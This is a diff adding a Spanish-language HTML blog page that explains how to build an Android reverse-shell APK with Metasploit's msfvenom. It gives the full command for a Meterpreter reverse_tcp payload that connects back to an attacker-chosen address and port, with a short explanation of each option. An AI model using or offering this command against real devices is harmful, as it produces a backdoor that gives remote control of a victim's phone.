@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<!--Metasploit android exploit -->
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>PidgK.io</title>
+	<style type="text/css">
+		.diver{
+			color: red;
+			width: 1000px;
+			height: 1000px;
+			border: 2px solid red;
+			border-radius: 2px 2px 2px 2px;
+
+		}
+		ol{
+			background-color: white;
+			width: 300px;
+			margin: 2px;
+
+		}
+		li{
+			background-color: gray;
+			border: 2px solid blue;
+			border-radius: 1px 1px 1px 1px;
+			color: darkred;
+		}
+		font{
+			color: green;
+			font-family: monospace;
+		}
+	</style>
+</head>
+<body bgcolor="black">
+	<div class="diver">
+		<h1 style="margin: 10px; position: relative; left: 35%; top: 0%;">PidGk Blogs</h1>
+		<h2 style="position: relative; top: -1%; left: 2%">Como crear un reverse shell para android con msfvenom</h2>
+		<p style="position: relative; top: -2%; left: 2%;">
+			En este post veremos como generar un exploit prefabricado con la herramienta de metasploit.
+			Quiero avizar<br> que no es recomendable utilizar estos tipos de exploit todo el tiempo, siempre es mejor crear los nuestros.<br>
+			Para comenzar abrimos un terminal y escribimos el siguiente comando<br>en la shell bash:<br>
+		</p>
+		<font style="position: relative; top: -4%; left: 2%">$SHELL COMMAND</font>
+		<ol style="position: relative; top: -4%; left: 2%">
+			<li style="width: 800px">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=7777 R>exploit.apk</li>
+		</ol>
+		<p style="position: relative; top: -3%; left: 2%">
+			La opcion -p se usa para especificar el nombre del exploit.<br>
+			LHOST Es para especificar la direccion a la cual se retornara la
+			sesion meterpreter.<br>
+			LPORT Es el puerto por donde se mandara la conexion.<br>
+			R> Es para colocar la ruta y el nombre donde se guardara nuestro apk.<br><br>
+			Despues de esto se generara el exploit pertinente.
+			Y de este modo ya tendriamos nuestro exploit generado.
+
+		</p>
+	</div>
+</body>
+</html>
